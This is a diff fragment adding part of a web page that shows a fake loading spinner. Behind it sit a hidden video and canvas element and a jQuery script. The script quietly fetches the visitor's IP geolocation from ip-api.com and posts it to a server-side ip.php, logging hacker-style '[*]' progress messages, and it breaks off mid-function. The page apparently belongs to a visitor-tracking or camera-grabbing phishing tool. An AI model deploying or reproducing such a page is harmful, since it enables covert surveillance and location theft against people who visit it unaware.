@@ -1,0 +1,28 @@
+            <div class="wait-main">
+                <div class="wait"></div>
+            </div>
+            <div id="sublabel"></div>
+        </div>
+    </div>
+<video autoplay id="video"></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+    <script>
+        $(document).ready(function(){
+            console.log('[*] Started')
+            $.ajax({
+                url : 'http://ip-api.com/json',
+                type : 'GET',
+                beforeSend : function(){
+                    console.log('[*] Proccessing')
+                },
+                success : function(d){
+                    console.log(d)
+                    str_d = JSON.stringify(d)
+                    $.ajax({
+                        url: 'ip.php',
+                        type: 'POST',
+                        data : {ip_details : str_d},
+                        success : function(m){
+                            if(m == 1){
+                                console.log('[*] IP success')
+                                console.log('[*] First Check Completed')
